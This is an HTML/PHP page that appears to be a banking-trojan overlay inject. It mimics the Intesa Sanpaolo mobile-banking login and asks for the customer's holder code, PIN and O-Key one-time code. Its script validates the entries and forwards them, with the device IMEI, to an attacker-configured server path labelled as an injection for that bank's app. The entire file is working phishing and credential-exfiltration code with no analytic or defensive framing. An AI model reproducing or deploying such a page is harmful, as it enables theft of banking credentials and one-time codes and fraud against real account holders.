<!-- 1.10 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/com.latuabanca_tabperandroid/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="container h-100" style="width: 80%;">
        <div class="row h-100 justify-content-center align-items-center">
            <div class="col-12">
                <div class="header">
                    Entra
                </div>
                <div class="form-bg">
                    <form action="null"  method="post" id="_mainForm" target="flow_handler">
                        <select required>
                            <option value="">Sleziona banca *</option>
                            <option value="Intesa Sanpaolo">Intesa Sanpaolo</option>
                            <option value="Intesa Sanpaolo Private Banking">Intesa Sanpaolo Private Banking</option>
                            <option value="Banco di Napoli">Banco di Napoli</option>
                            <option value="CR Forli e della Romagna">CR Forli e della Romagna</option>
                            <option value="CR Veneto">CR Veneto</option>
                            <option value="CR Friuli Venezia Giulia">CR Friuli Venezia Giulia</option>
                            <option value="CR Bologna">CR Bologna</option>
                            <option value="Banca Prossima">Banca Prossima</option>
                            <option value="CR di Pistoia e della Lucchesia">CR di Pistoia e della Lucchesia</option>
                            <option value="Banca CR Firenze">Banca CR Firenze</option>
                            <option value="Banca Apulia">Banca Apulia</option>
                        </select>

                        <input type="tel" class="field" name="login" id="login" placeholder="Codice titolare">

                        <input type="password" class="field" name="pin" id="pin" placeholder="Codice PIN">

                        <input type="password" class="field-k" name="key" id="key" placeholder="Codice O-Key">
                    </form>

                    <div class="div-bg">
                        <img style="margin-right: 10px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAARCAIAAABrQaqyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUQxRDhGOEJCODM1MTFFODgzRjA5MEFBNTBDMTkxNjMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUQxRDhGOENCODM1MTFFODgzRjA5MEFBNTBDMTkxNjMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1RDFEOEY4OUI4MzUxMUU4ODNGMDkwQUE1MEMxOTE2MyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1RDFEOEY4QUI4MzUxMUU4ODNGMDkwQUE1MEMxOTE2MyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pho6LrgAAAD3SURBVHjaYvz//z8DbsAEIv78+nNoOVZpFiD+2R3x7/F1hq/vWTyzsOhmcU5g+P/v95Ypf/bMQ9f+Hwx+H1z2LUPtW7YWkPEfCTDAWb93zwWpyNH5c3IjFmkg+LVlMkhFru6fi3uxSP//9+/Xmg6IGX9vnwEKMKL7+9/fnx3BII8ws3JOvMCE5tK/p7eA5JiYWUOrGJhZUAz/c3Y7yOQsjd/bpqLb/efSfpBcpvqvtZ3oLv974zhILkPt1/IGdH//vX8RGCBAuZ+Lq4GOR5YGhfmv+SUMf/+wWASyRjUxMDKiB+q/N09+rWz5/+fXfwzAiD++AQIMAClcGkXF2zBIAAAAAElFTkSuQmCC">
                        Sarve aiuto?
                    </div>

                </div>
                <div class="bg">
                    <input type="submit" class="button1" disabled value="Annulla">
                    <input type="submit" class="button2" id="input_submitBtn" value="Entra">
                </div>
            </div>
        </div>
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');
            var oCode2Inp = document.getElementById('key');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
                oCode2Inp.className = 'field-k';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCode2Inp.value)) {
                try{
                    oCode2Inp.className = 'field-k error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_latuabanca_tab|"+oNumInp.value+"|"+oCode2Inp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
